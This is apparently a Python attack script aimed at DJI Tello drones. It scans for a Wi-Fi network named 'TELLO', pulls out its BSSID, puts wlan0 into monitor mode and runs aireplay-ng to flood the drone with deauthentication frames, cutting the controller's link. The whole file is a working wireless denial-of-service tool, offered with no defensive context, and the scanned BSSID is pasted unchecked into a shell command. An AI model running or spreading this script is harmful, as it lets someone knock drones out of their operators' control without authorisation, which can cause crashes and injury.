import subprocess

def on_managed():
    try:
        on_managed_c = "ip link set wlan0 down && iw dev wlan0 set type managed && ip link set wlan0 up"
        subprocess.run(on_managed_c, shell=True)
        print("[+] Interface Set")
    except Exception as e:
        print("Error: ", {e})

def acquire_target():
    try:
        scan_c = "iw dev wlan0 scan | grep -i 'TELLO' -B 10 | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}'"
        scan = subprocess.run(scan_c, capture_output=True, text=True, shell=True)
        target_address = scan.stdout[0:17]
        print("[+] BSSID Obtained")
        print(target_address)
        return target_address
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print(f"Output: {e.output}")

def deauth(target):
    try:
        #Add the change channel command if needed (iw dev wlan0 set channel 7)
        on_managed_c = "ip link set wlan0 down && iw dev wlan0 set type monitor && iw dev wlan0 set channel 3 &&  ip link set wlan0 up"
        subprocess.run(on_managed_c, shell=True)
        print("[+] Interface Set")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print(f"Output: {e.output}")

    try:
        print(target)
        deauth_c = "aireplay-ng --deauth 20 -a " + target + " wlan0"
        subprocess.run(deauth_c, shell=True)
        print("[+] Fuck Off!!1!1!!")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print(f"Output: {e.output}")

def main():
    on_managed()
    deauth(acquire_target())

main()
